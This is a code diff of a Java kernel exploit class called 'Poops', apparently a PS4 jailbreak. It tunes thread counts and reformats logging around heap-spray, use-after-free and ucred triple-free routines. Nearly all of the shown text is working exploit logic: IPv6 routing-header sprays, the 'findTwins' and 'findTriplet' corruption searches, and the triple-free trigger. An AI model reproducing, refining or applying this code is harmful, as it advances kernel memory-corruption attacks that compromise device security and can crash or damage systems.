@@ -24,8 +24,8 @@ public class Poops {
 	private static final int TWIN_TRIES   = 4;
 	private static final int UAF_TRIES    = 100000;
     private static final int KQUEUE_TRIES = 300000;
-    private static final int IOV_THREAD_NUM = 4;
-    private static final int UIO_THREAD_NUM = 4;
+    private static final int IOV_THREAD_NUM = 8;	// 4
+    private static final int UIO_THREAD_NUM = 8;	// 4
     private static final int PIPEBUF_SIZE = 0x18;
 
     private static final int COMMAND_UIO_READ = 0;
@@ -509,7 +509,7 @@ public class Poops {
     }
 
 private static boolean findTwins() {
-    int max_attempts = 4;   // sa
+    int max_attempts = 4;
 
     for (int attempt = 0; attempt < max_attempts; attempt++) {
         console.println("Twins attempt " + (attempt + 1) + "/" + max_attempts);
@@ -518,20 +518,14 @@ private static boolean findTwins() {
         for (int i = 0; i < ipv6Socks.length; i++) {
             freeRthdr(ipv6Socks[i]);
         }
-
-        try { 
-            Thread.sleep(1); 
-        } catch (Exception ignored) {}
+        try { Thread.sleep(1); } catch (Exception ignored) {}
 
         // Spray phase
         for (int i = 0; i < ipv6Socks.length; i++) {
             sprayRthdr.putInt(0x04, RTHDR_TAG | i);
             setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
         }
-
-        try { 
-            Thread.sleep(1); 
-        } catch (Exception ignored) {}
+        try { Thread.sleep(1); } catch (Exception ignored) {}
 
         // Search phase
         for (int i = 0; i < ipv6Socks.length; i++) {
@@ -549,14 +543,10 @@ private static boolean findTwins() {
                 return true;
             }
         }
-
-        console.println("No twins on attempt " + (attempt + 1) + ", retrying...");
-        try { 
-            Thread.sleep(2); 
-        } catch (Exception ignored) {}
+        // console.println("No twins on attempt " + (attempt + 1) + ", retrying...");
+        try { Thread.sleep(2); } catch (Exception ignored) {}
     }
-
-    console.println("FindTwins failed after " + max_attempts + " attempts");
+    // console.println("Find Twins failed after " + max_attempts + " attempts");
     return false;
 }
 
@@ -601,7 +591,7 @@ private static int findTriplet(int master, int other, int timeout) {
         try { Thread.sleep(1); } catch (Exception ignored) {}
     }
 
-    console.println("FindTriplet failed");
+    console.println("Find Triplet failed");
     return -1;
 }
 
@@ -752,10 +742,10 @@ private static int findTriplet(int master, int other, int timeout) {
 
             removeUafFile();
         } catch (Exception e)
-        {
-            console.println("exception during stage 1");
-            return false;
-        }
+			{
+				console.println("exception during stage 1");
+				return false;
+			}
         return true;
     }
 
@@ -889,7 +879,7 @@ private static int findTriplet(int master, int other, int timeout) {
             close(dup(uafSock));
 
             if (!findTwins()) {
-                console.println("findTwins failed");
+                console.println("Find Twins failed");
                 return false;
             }
 
@@ -920,7 +910,7 @@ private static int findTriplet(int master, int other, int timeout) {
             sched_yield();
 			triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
             if (triplets[1] == -1) {
-                console.println("triplet 1 failed");
+                console.println("Triplet 1 failed");
                 return false;
             }
 
@@ -929,7 +919,7 @@ private static int findTriplet(int master, int other, int timeout) {
             sched_yield();
 			triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
             if (triplets[2] == -1) {
-                console.println("triplet 2 failed");
+                console.println("Triplet 2 failed");
                 return false;
             }
 
@@ -1014,7 +1004,7 @@ private static int findTriplet(int master, int other, int timeout) {
         // console.println("Initial triple free\nJika diam disini > 30 detik, Tahan tombol PS -> Power -> Restart PS4");
 		console.println("Initial triple free");
         if (!triggerUcredTripleFree()) {
-            cons.println("triple free failed");
+            cons.println("Triple free failed");
             cleanup();
             return -4;
         }
